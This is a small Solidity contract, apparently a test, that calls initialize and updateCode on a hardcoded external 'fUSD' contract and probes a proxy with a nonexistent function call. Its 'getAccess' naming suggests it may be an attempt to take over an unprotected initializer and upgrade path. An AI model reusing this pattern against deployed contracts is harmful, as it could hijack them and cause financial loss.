// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

interface IFUSD {

    function initialize(uint256 _totalsupply) external;
    function updateCode(address newCode) external;
}

contract test {

    address private owner;
    constructor() public {
      owner = msg.sender;
   }
   modifier onlyOwner {
      require(msg.sender == owner);
      _;
   }
    event Response(bool success, bytes data);
    IFUSD fUSD = IFUSD(0xa6C182d36657636984B4fa80386925e451920270);

    
    function getAccess(uint _total) external onlyOwner {
        return fUSD.initialize(_total);
    }

    
    function UpdateLogic(address dContract) external onlyOwner {
        return fUSD.updateCode(dContract);
    }

    
    function TESTME(address payable _proxyAddress) external onlyOwner{
        (bool success, bytes memory data) = _proxyAddress.call(
            abi.encodeWithSignature("doesNotExist()")
        );

        emit Response(success, data);
    }
    
}